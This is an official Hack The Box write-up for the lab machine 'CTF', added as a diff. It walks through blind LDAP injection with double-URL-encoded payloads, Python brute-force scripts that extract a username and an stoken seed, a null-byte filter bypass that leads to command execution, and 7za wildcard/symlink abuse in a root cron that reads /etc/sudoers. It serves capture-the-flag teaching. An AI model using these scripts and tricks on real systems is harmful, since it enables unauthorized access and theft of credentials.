@@ -1,0 +1,357 @@
+CTF
+
+27th May 2019 / Document No D19.100.24
+
+Prepared By: MinatoTW
+Machine Author: 0xEA31
+Difficulty: Insane
+Classification: Official
+
+                                                                        Page 1 / 18
+SYNOPSIS
+
+CTF is an insane difficulty Linux box with a web application using LDAP based authentication. The
+application is vulnerable to LDAP injection but due to character blacklisting the payloads need to
+be double URL encoded. After enumeration, a token string is found, which is obtained using
+boolean injection. Using the token an OTP can be generated, which allows for execution of
+commands. After establishing a foothold, a cron can be exploited to gain sensitive information.
+
+Skills Required  Skills Learned
+
+     Scripting        LDAP Injection
+                      Wildcard and Symlink abuse
+
+                                                  Page 2 / 18
+ENUMERATION
+NMAP
+
+ ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.122 | grep ^[0-9] | cut -d
+ '/' -f 1 | tr ' \n' ' ,' | sed s/,$//)
+ nmap -sC -sV -p$ports -sT 10.10.10.122
+
+Apache is running on port 80 and SSH on port 22.
+
+                                                                                                                  Page 3 / 18
+APACHE
+
+Apache hosts a website which is protected from brute force attempts.
+
+The login page requires an OTP to login.
+
+Checking the source of the page we find a comment,
+Maybe this is a hint towards the login being LDAP based, because LDAP contains schema and
+attributes.
+
+                                                                                                                  Page 4 / 18
+LDAP INJECTION
+
+Now lets try basic injection payloads like *)(uid=* . Where uid stores the user ID.
+
+The server doesn't reply back with any message. So maybe there's character blacklisting. Let's
+send this to burp change the encoding.
+By default a browser URL encodes it once, we can try encoding it again so that it's double
+encoded. The payload is,
+ *)(uid=* -> %2A %29%28u id%3D% 2A
+
+After sending it the server responded with "Cannot login". So the LDAP query succeeded but
+login failed due to wrong OTP.
+
+                                                                                                                  Page 5 / 18
+However, if we tried a payload like, *)(uid=a* the server would say username not found. That
+means the uid doesn't start with a.
+
+Let's try to find the username based on this boolean logic. The payloads will try a character each
+until "Cannot login" is returned by the server. They'll be of the form,
+*)(uid=a* else *)(uid=b* and so on until a character satisfies the condition. Then we take
+that character and proceed to the next.
+It'll be easier to script this,
+ #!/usr/bin/python
+ from requests i mport post
+ from urllib import quote
+ import string
+ url = "http://10.10.10.122/login.php"
+ chars = string.ascii_lowercase
+ for i i n chars:
+
+           payload = ' *)(uid={}*'. format(i)
+           payload = quote(payload)
+           data = { 'inputUsername' : payload, ' inputOTP' : 'htb' }
+           res = post( url, data = data )
+           if 'Cannot login' i n res.content:
+           print i
+           break
+
+                                                                                                                  Page 6 / 18
+The script just checks for the first character of the uid attribute. Python requests module url
+encodes the payload by default , so just need to encode it once more using urllib.quote. As seen
+earlier having `Cannot found' in response means that the query was valid. Running the script we
+find `l' to be the first character.
+
+Lets extend the script to find the complete username. Make the following changes to the script.
+ username = []
+
+ while True:
+           for i i n chars:
+                     payload = '*)(uid={}*'. format(''. join(username) + i)
+                     payload = quote(payload)
+                     data = { ' inputUsername' : payload, ' inputOTP' : 'htb' }
+
+                     res = post( url, data = data )
+                     if 'Cannot login' in res.content:
+
+                               username.append(i)
+                               print "username: " + ' '.join(username)
+                               break
+
+The username list stores the characters and keeps checking the uid character by character. If
+one is found then it's pushed to the list and used for the next iteration.
+ $ python brute.py
+ username: l
+ username: ld
+ username: lda
+ username: ldap
+ username: ldapu
+ username: ldapus
+ username: ldapuse
+ username: ldapuser
+
+The username is found to be ldapuser.
+
+                                                                                                                  Page 7 / 18
+Now onto the password or token string here. As the comment suggested the token string is
+stored in an existing attribute. So first we'll have to find a suitable attribute which could store it.
+We can brute force attributes based on the same logic as before.
+ ldapuser)(attribute=*
+
+The page should return `Cannot login' if the attribute is present else `Not found'. Lets script this. A
+list of common LDAP attributes can be obtained h ere. Here's the script,
+ #!/usr/bin/python
+ from requests import post
+ from urllib import quote
+ import string
+
+ url = "http://10.10.10.122/login.php"
+ chars = string.ascii_lowercase
+ attrs = open('attributes.txt').readlines()
+
+ for i in attrs:
+           payload = 'ldapuser)({}=*'. format(i.strip())
+           payload = quote(payload)
+           data = { ' inputUsername' : payload, 'inputOTP' : 'htb' }
+
+           res = post( url, data = data )
+           if ' Cannot login' in res.content:
+
+                     print "Attribute found " + i
+
+It reads an attribute from the file, plugs it into the query and sends it. Running the script,
+
+ $ python attributes.py
+
+ Attribute found cn
+ Attribute found commonName
+ Attribute found mail
+ Attribute found name
+ Attribute found objectClass
+ Attribute found pager
+ Attribute found sn
+
+                                                                                                                  Page 8 / 18
+ Attribute found surname
+ Attribute found uid
+ Attribute found userPassword
+
+All other attributes are common except pager. It stores only numbers, so it could contain the
+token string. We write a script along the same lines as earlier.
+
+ #!/usr/bin/python
+ from requests i mport post
+ from urllib import quote
+ import string
+ from time import sleep
+
+ url = " http://10.10.10.122/login.php"
+ chars = string.digits
+ token = []
+ k = 81
+
+ while k > 0  :
+           for i in chars:
+           payload = ' ldapuser)(pager={}*'. format(''. join(token) + i)
+           payload = quote(payload)
+           data = { ' inputUsername' : payload, 'inputOTP' : ' htb' }
+           sleep(1 )
+           res = post( url, data = data )
+           if ' Cannot login' in res.content:
+                     token.append(i)
+                     k = k - 1
+                     print " Token: " + ' '.join(token)
+                     break
+
+We know the length of the token i.e 81. The sleep is to ensure that the server doesn't block us.
+Running the script for a while,
+
+ $ python token.py
+
+ Token: 2
+ Token: 28
+ Token: 285
+
+                                                                                                                  Page 9 / 18
+ ------------ SNIP -----------
+ Token:
+ 285449490011357156531651545652335570713167411445727140604172141456711102716
+ 717
+ Token:
+ 285449490011357156531651545652335570713167411445727140604172141456711102716
+ 7170
+ Token:
+ 285449490011357156531651545652335570713167411445727140604172141456711102716
+ 71700
+ Token:
+ 285449490011357156531651545652335570713167411445727140604172141456711102716
+ 717000
+
+The token obtained is:
+285449490011357156531651545652335570713167411445727140604172141456711102716717000,
+which is 81 digits in length.
+A google search about it refers to stoken.
+
+Where the 81 digits are of "Compress Token Format" or CTF, from which the box gets its name.
+
+                                                                                                                 Page 10 / 18
+GENERATING OTP
+
+Install stoken in order to create OTP.
+
+ apt install stoken -y
+ stoken import --token
+ 285449490011357156531651545652335570713167411445727140604172141456711102716
+ 717000
+ stoken setpin # Enter 0000
+
+Leave the password as empty and pin to 0000. Before we can generate OTP we need to sync
+our time with that of the box. This can be achieved by obtaining the server's time from the HTTP
+headers and converting it to epoch format.
+
+ #!/usr/bin/python
+ from requests import get
+ from datetime import datetime
+ url = 'http://10.10.10.122'
+
+ res = get(url)
+ date = res.headers['Date']
+ pattern = '%a, %d %b %Y %H:%M:%S GMT'
+
+ obj = datetime.strptime( date, pattern )
+ diff = datetime.utcnow() - datetime.now()
+ print int(obj.strftime('%s')) - int(diff.total_seconds())
+
+The script fetches the time from the server, converts it to a datetime object and adds difference
+in the timezone. The difference is calculated from UTC.
+
+ stoken --use-time=$(python date.py)
+
+Using the OTP we can now log in.
+
+                                  Page 11 / 18
+FOOTHOLD
+
+After logging in we are taken to a page where we can issue commands.
+
+Generating an OTP and issuing a command fails with an error saying "User must be member of
+root or adm group and have a registered token to issue commands on this server". So apart from
+the username and OTP check there's an extra filter for the user i.e group.
+The ldap filter could be something like,
+ (&(&(uid=$_POST) (|(group=root)(group=adm))(pager=token))
+We can bypass this by closing the filters and a null byte like this,
+ ldapuser)))%00
+Which will result in,
+ (&(&(uid=ldapuser)))%00)(|(group=root)(group=adm))(pager=token))
+The part after the null byte gets ignored and the query evaluates to true.
+
+                                                                                                                 Page 12 / 18
+Lets try logging in now with an OTP. Use burp to intercept the login request because the browser
+might remove the null byte. Double url encode the payload and add the OTP.
+
+Now when we try to issue commands it should allow us to.
+
+We can view the contents of the php files now, to avoid it getting executed use base64.
+ base64 login.php
+
+                                                                                                                 Page 13 / 18
+Copy the output and decode it locally.
+ base64 -d login.b64 > login.php
+After decoding we find the credentials for ldapuser at the top.
+Using these we can SSH into the server.
+
+                                                                                                                 Page 14 / 18
+PRIVILEGE ESCALATION
+ENUMERATION
+
+In the root folder of the box there's a folder named backup. It consists of a script and various
+backups.
+
+Let's examine the script honeypot.sh.
+ # get banned ips from fail2ban jails and update banned.txt
+ # banned ips directily via firewalld permanet rules are **not** included in
+ the list (they get kicked for only 10 seconds)
+ /usr/sbin/ipset list | grep fail2ban -A 7 | grep -E
+ '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u >
+ /var/www/html/banned.txt
+ # awk '$1=$1' ORS='<br>' /var/www/html/banned.txt >
+ /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp
+ /var/www/html/banned.txt
+ # some vars in order to be sure that backups are protected
+ now=$(date +"%s")
+ filename=" backup.$ now"
+ pass=$(openssl passwd -1 -salt 0xEA31 -i n /root/root.txt | md5sum | awk
+ '{print $1}')
+
+ # keep only last 10 backups
+ cd /backup
+ ls -1t *.zip | tail -n +11 | xargs rm -f
+ # get the files from the honeypot and backup 'em all
+
+                                                                                                                 Page 15 / 18
+ cd /var/www/html/uploads
+ 7za a /backup/$ filename. zip -t7z -snl -p$ pass -- *
+ # cleaup the honeypot
+ rm -rf -- *
+ # comment the next line to get errors for debugging
+ truncate -s 0 /backup/error.log
+The script gets the list of banned IP addresses. It creates a filename based on timestamp and
+salted hash using the contents of root.txt. Then it removes all but the last 10 backups. The script
+then creates an archive using 7za from /var/www/html/uploads.
+ 7za a /backup/$ filename.zip -t7z -snl -p$pass -- *
+The interesting switch used here is -snl which according to the man page is used to preserve
+symlinks and the wildcard which includes all files. We can abuse this by symlinking a file to
+another sensitive file and using the @ operator for a listfile.
+For example,
+ ln -s /etc/passwd listfile
+ touch @listfile
+ 7za a pwn.zip -snl -- *
+
+We can see that it tries to archives all files named with contents of passwd and sends it to the
+stderr..Using this trick we can view a sensitive file like sudoers or shadow.
+
+                                                                                                                 Page 16 / 18
+ABUSING THE CRON
+
+Though we don't have write permissions to the uploads folder, the page we used to get RCE was
+running as apache and can be used to create files.
+
+Create two files listfile and @listfile,
+
+ ln -s /etc/sudoers uploads/listfile
+ touch uploads/@listfile
+
+Run tail -f error.log on the box to see the errors.
+
+                                                     Page 17 / 18
+From the timestamps on the zip we notice that the cron is run every 60 seconds.
+Within a minute the contents of sudoers should be visible.
+
+And we see the contents of sudoers line by line. The same trick can be used to read the root flag.
+                                                                                                                 Page 18 / 18
+
